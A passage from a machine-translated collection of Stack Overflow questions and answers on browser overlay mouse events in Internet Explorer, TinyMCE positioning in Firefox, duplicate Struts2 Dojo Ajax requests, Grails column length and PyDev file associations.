我没有对`document.elementFromPoint()`vs进行任何性能比较`pointer-events:none`。当前的浏览器（Firefox、Chrome、...）可以同时处理这两种情况，Internet Explorer 只能使用这种`document.elementFromPoint()`方法。为了简单起见，我没有`pointer-events:none`为现代浏览器实现备用路由。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-06-20T08:13:29.743

事实证明，在 IE 中，没有背景（即`background: transparent`）和[渐变过滤器](http://msdn.microsoft.com/en-us/library/ms532997%28v=vs.85%29.aspx)集的元素不会接收鼠标事件。[演示](http://jsfiddle.net/jefferyto/pHjFr/)

这是一个令人高兴的巧合，因为您使用[RGBa 背景颜色](http://css-tricks.com/rgba-browser-support/)作为叠加层，而 IE 中 RGBa 颜色的解决方法之一是渐变滤镜。

通过在叠加层上设置这些样式（对于 IE）：

```
background: transparent;
-ms-filter: "progid:DXImageTransform.Microsoft.gradient(startColorstr=#7F000000,endColorstr=#7F000000)"; /* IE8 */
filter: progid:DXImageTransform.Microsoft.gradient(startColorstr=#7F000000,endColorstr=#7F000000);   /* IE6 & 7 */
zoom: 1; 
```

鼠标事件通过覆盖层并到达底层元素，因此正确突出显示内部/次要元素。

IE7/8 中存在的其他问题：

*   使用[`element.attachEvent`](http://www.quirksmode.org/js/events_advanced.html#link6)时，事件名称需要以“on”为前缀：

    ```
    document.body.attachEvent('onmouseover', function(e) { ... }) 
    ```

*   要查找[事件的目标](http://www.quirksmode.org/js/events_properties.html#target)，您需要访问`event.srcElement`而不是`event.target`.

*   正如 rodneyrehm 所说，`Array.indexOf`不支持。

所以这里的解决方案版本也适用于 IE 7-9：http: [//jsfiddle.net/jefferyto/Q7ZQV/7/](http://jsfiddle.net/jefferyto/Q7ZQV/7/)

（顺便说一句，对于跨越多行的内联元素，突出显示是错误的，例如“浏览其他问题...”行中的“问你自己的问题”链接。）

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-06-17T15:28:21.890

使用 Internet Explorer 的特殊例程（在 IE9 中测试，未在 IE8 中测试），我想出了[这个](http://jsfiddle.net/Vw3yX/5/). 然而，它还不完美。当在同一个元素内移动鼠标时，会出现闪烁，因为例程运行多次（有时覆盖完全消失）。我希望尽快完善这一点。

常规：

*   我专门检查了浏览器是否为 IE 并执行了以下操作：
*   我将`mousemove`事件分配给使用`document.elementFromPoint(x, y)`.
*   我分配`mouseover`了一个清除功能，可以立即删除覆盖。（这会导致闪烁和可能的完全覆盖删除，即使鼠标仍在元素上。）

元素从点函数

```
function ep(e)
{
    var ev = {target:document.elementFromPoint(e.clientX, e.clientY)};
    handler(ev);
} 
```

清算功能

```
function clear(e)
{
   cur = null;
   overlay.style.display='none';
} 
```

欢迎反馈和建议。我仍在努力，我将发布更新的 JSFiddle 链接。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-06-18T02:41:39.697

You could avoid the mouse events being intercepted by the overlay by changing its properties, namely by making it transparent and relying on `outline` or, with size calculation adjustments, `border`:

```
background:transparent;
outline:1px dotted red; 
```

[Fiddle'd](http://jsfiddle.net/Q7ZQV/6/)

Alternatively, you could *not* rely on an overlay but instead toggle a class on the element itself whenever "moused over". If you cache the reference to it, you could then remove the class when "moused out", rinse, repeat. I'll fiddle with the idea for a little bit more to see how viable it is.

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-06-20T11:55:00.673

我快速浏览了您的小提琴，并分叉了一个适用于 IE8 的版本，[可在此处找到](http://jsfiddle.net/e9TN3/1/)。事实证明`indexOf`，尤其是与按位结合使用的`~`IE 似乎并不那么喜欢，所以最快的修复方法似乎是简单的`for(i=0;i<no.length;i++){}`.

如前所述，`e.target`在 IE 中不起作用，因为 JScript 调用此属性`srcElement`。这是有道理的，因为 IE 事件总是冒泡到文档中，所以所有事件都有一个源，而不是一个目标。

最大的区别在于您的 CSS：再次 IE 是一种痛苦：MS 认为`rgba`出于某种原因这不好。似乎他们更喜欢编写地球上没有人能理解的 CSS：

```
filter: progid:DXImageTransform.Microsoft.gradient(GradientType=0.3,startColorstr='#4c333333', endColorstr='#4c666666'); 
```

给你一个半透明的灰色覆盖。老实说，我在[这里](https://stackoverflow.com/questions/3975688/css-background-opacity-with-rgba-not-working-in-ie-8)找到了我的答案。

当涉及到指针事件时，唯一的方法，AFAIK，是另一个事件监听器，它处理`onclick`事件：

```
function noClick(e)
{
    e = e || window.event;
    if (e.preventDefault)
    {
        e.preventDefault();
        e.stopPropagation();
        return false;
    }
    e.returnValue = false;
    e.cancelBubble = true;
    return false;
} 
```

希望这对您有所帮助...

# javascript - 如何更正这个 TinyMCE 编辑器在 Firefox 中的位置？

> ID：11052992
> 
> 赞同：5
> 
> 时间：2012-06-15T14:47:56.277
> 
> 标签：javascript, tinymce

我正在尝试使用 CSS 将 TinyMCE 编辑器绝对定位在设定位置。在 Chrome 中，这可以正常工作。然而，在 Firefox 中，编辑器消失了。我在一个复杂的应用程序中这样做，但我能够用一个非常简单的测试用例重现它：

```
<style type='text/css'>
    div.container {
    position: absolute;
    left: 0;
    top: 0;
    width: 100%;
    height: 100%;
    min-height: 600px;
}

div.container div.text {
    border: 1px dashed black;
    overflow: hidden;
}

div.container div.text div.mceIframeContainer {
    position: absolute;
    top: 0px;
    left: 0px;
}

  </style>

<script type='text/javascript'>//<![CDATA[ 
Event.observe(window, "load", function(){

function setup()
{
    var myTinyMCESettings = {
        mode: 'none',
        width: '100%',
        height: '9000px',
        body_class: 'TypeRegion'
    };

    var editorId = $(document.body).down('div.container div.text div.editor').identify();

    tinyMCE.init(myTinyMCESettings);

    tinyMCE.execCommand("mceAddControl", true, editorId);
}

setup();

});//]]>  

</script>

</head>
<body>
  <div class="container">
    <div class="text" style="position:absolute;top: 2in; left:2in; width: 2in; height: 3in;">
        <div class="editor">Enter text here</div>
    </div>
</div> 
```

[这是此测试用例的 JSFiddle](http://jsfiddle.net/H4Var/)。将 Chrome 与 Firefox 进行比较，注意编辑器在 Firefox 中显然是如何缺失的……是什么原因造成的，我该如何纠正这个问题？

**更新：** [我尝试使`td`有相对定位](http://jsfiddle.net/Ke7Tz/1/)，没有变化：

```
div.container div.text table tr td {
    position: relative;
} 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-06-15T19:48:56.193

编辑器在 Firefox 中 - 它的宽度为零，使其不可见。由于无论如何您都在为包含块定义设置宽度`div.text`，因此您可以使用该值来给出明确的宽度，`div.mceIframeContainer`以保证宽度计算在跨浏览器中是一致的。我在`oninit`处理程序中执行此操作，但您可以决定哪种方法最适合您的情况。

显式设置宽度会使编辑器出现，但会暴露 Firefox 中的另一个问题，即编辑器的移动位置高于预期。这似乎是由 TinyMCE 创建的一些元素引起的，即它插入表格的相对定位跨度。

我不完全确定为什么它将表格粘贴在 span 中，但在 Firefox 中观察到的偏移量似乎与 span 既是相对定位又是内联元素的事实有关。应用样式

```
.defaultSimpleSkin {
    display:block;
} 
```

解决问题。您可以[查看此 jsFiddle 示例](http://jsfiddle.net/CXXHL/1/)以查看实际更改。

# struts2 - 为什么 Ajax 请求被调用两次？

> ID：11052993
> 
> 赞同：0
> 
> 时间：2012-06-15T14:47:58.583
> 
> 标签：struts2, dojo

我有一个关于 Struts2、Ajax 的问题。

几天前，我在我的项目中添加了一个拦截器，以验证用户在他/她发出请求时是否已登录。后来，我注意到我项目中的大多数请求都被调用了两次。

经过一些调试后，我注意到它可能与我使用的 Ajax 标记（Dojo）有关。

我注意到每次使用 < sx > 标记的 ajax 请求时，该请求都会被调用两次。像这儿：

```
<s:form action='crear_proyecto'>
        <div><s:textfield id="jefe_proyecto_text" label="Jefe de proyecto"/></div>

        <s:url id="elegir_usuario_url" value="/buscar_usuarios.action">
            ...
        </s:url>

        <sx:bind sources="jefe_proyecto_text" events="onfocus" targets="buscar_usuarios_dialog" href="%{elegir_usuario_url}"/>
        <sx:submit id="crear_proyecto_submit" targets="ventana_mensaje_proyecto" value="Crear proyecto"/>
    </s:form> 
```

有谁知道为什么会这样？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T08:18:40.940

Can you check what is your main page header consists ?

like suppose it should have mandatory as `<%@ taglib prefix="sx" uri="/struts-dojo-tags"%>`

along with this it should have this

```
<sx:head debug="false" cache="false" compressed="false" parseContent="true" /> 
```

parseContent should be 'true' -- if it is false then it will submit record twice it seems.

# grails - Grails 域类

> ID：11052994
> 
> 赞同：0
> 
> 时间：2012-06-15T14:48:00.923
> 
> 标签：grails, types, dns, character

我定义了以下域类：

```
class Content {

  Map i18nDescription = [:]
  ...

} 
```

如果运行以下代码

```
content.i18nDescription['it'] = "desc desc...."
content.save() 
```

我收到以下错误：

```
util.JDBCExceptionReporter ERROR: value too long for type character varying(255) 
```

（我使用 postgres 作为数据库）

如何`i18nDescription['it']`使用增加数据库中字段的大小

```
static constraints = {} 
```

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-15T15:03:09.043

```
static mapping = {
        title i18nDescription: "text"
    } 
```

这将创建一个文本字段。其中有4000多个字符。

# python - eclipse pydev可以将文件解释为没有后缀的python文件吗

> ID：11052999
> 
> 赞同：1
> 
> 时间：2012-06-15T14:48:33.030
> 
> 标签：python, eclipse, pydev

如果我有一个没有后缀的 python 文件。如果包含#!/usr/bin/python，pydev 可以使用文件的第一行将该文件作为 python 文件读取吗？我并不特别关心使用第一行，只是该行存在并且可能可用。如果有一种手动方法可以将文件标记为 python 文件而不用弄乱它的后缀，那也很好。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-16T09:59:28.423

只需右键单击该文件，然后单击“打开方式”->“其他”，然后选择“Python 编辑器”并单击“确定”。Eclipse 会记住您的选择，然后当您双击它时，它将在 Python 编辑器中打开该特定文件。